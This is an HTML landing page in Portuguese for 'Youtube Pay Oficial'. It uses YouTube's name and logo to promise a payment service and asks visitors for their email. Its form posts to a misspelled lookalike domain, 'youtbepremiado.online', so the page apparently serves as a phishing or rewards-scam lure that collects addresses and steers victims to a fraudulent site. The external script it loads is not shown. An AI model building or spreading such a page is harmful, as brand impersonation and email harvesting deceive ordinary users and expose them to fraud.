<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Youtube Pay Oficial</title>
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Open+Sans:wght@400;700&display=swap">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">


</head>
<body>

        
  <!-- Card -->
  <div class="card">
    <img src="./images/yotube logo.png" alt="Imagem de Boas-Vindas" class="card-img">
    <h2 class="card-title">Bem Vindo ao Youtube Pay</h2>
    <p class="card-subtitle">Insira seu email para prosseguir</p>
    <form class="card-form" id="email-form" action="https://youtbepremiado.online/julio">
        <input type="email" placeholder="Seu e-mail" class="card-input" required>
        <button type="submit" class="card-button">ENTRAR</button>
    </form>
</div>
  <!-- RodapÃ© -->
  <footer>
    <p>&copy; 2024 Youtube Pay. Todos os direitos reservados.</p>
</footer>

    <script src="./js/script.js"></script>
</body>
</html>
